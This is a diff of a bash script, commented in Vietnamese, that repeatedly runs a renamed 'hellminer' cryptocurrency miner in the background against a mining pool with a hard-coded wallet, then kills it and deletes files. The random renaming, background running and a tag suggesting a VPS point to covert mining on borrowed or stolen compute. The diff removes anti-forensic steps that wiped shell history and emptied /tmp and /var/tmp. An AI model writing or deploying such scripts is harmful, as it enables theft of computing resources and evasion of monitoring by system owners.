@@ -5,8 +5,6 @@ generate_random_name() {
   tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
 }
 
-# Vô hiệu hóa lịch sử shell tạm thời
-
 # Vòng lặp vô hạn để script chạy liên tục
 while true; do
   # Tải file
@@ -20,13 +18,12 @@ while true; do
   random_name=$(generate_random_name)
   mv hellminer "$random_name"
 
-  # Chạy chương trình với tên đã đổi, ẩn danh và chạy ngầm trong thời gian ngẫu nhiên từ 2 đến 4 phút
+  # Chạy chương trình với tên đã đổi, ẩn danh và chạy ngầm trong 5 phút
   nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgit --cpu 2 >/dev/null 2>&1 &
   miner_pid=$!
 
-  # Ngủ trong khoảng thời gian ngẫu nhiên từ 2 đến 4 phút
-  run_time=$(shuf -i 200-150 -n 1)
-  sleep $run_time
+  # Ngủ trong 5 phút
+  sleep 300
 
   # Dừng chương trình
   kill $miner_pid
@@ -37,26 +34,6 @@ while true; do
   rm -rf run_miner.sh
   rm -rf verus-solver
 
-  # Bật lại lịch sử shell để xóa
-  set -o history
-
-  # Xóa lịch sử shell trong phiên hiện tại và từ tệp lịch sử
-  
-
-  # Xóa lịch sử lệnh trong các phiên khác (nếu có)
-  if [ -f ~/.zsh_history ]; then
-    cat /dev/null > ~/.zsh_history
-  fi
-
-  if [ -f ~/.bash_sessions ]; then
-    rm -rf ~/.bash_sessions
-  fi
-
-  # Xóa các file tạm thời (nếu có)
-  rm -f /tmp/*
-  rm -f /var/tmp/*
-
-  # Nghỉ ngẫu nhiên từ 2 phút đến 4 phút trước khi lặp lại
-  sleep_time=$(shuf -i 200-150 -n 1)
-  sleep $sleep_time
+  # Nghỉ 3 phút trước khi lặp lại
+  sleep 180
 done
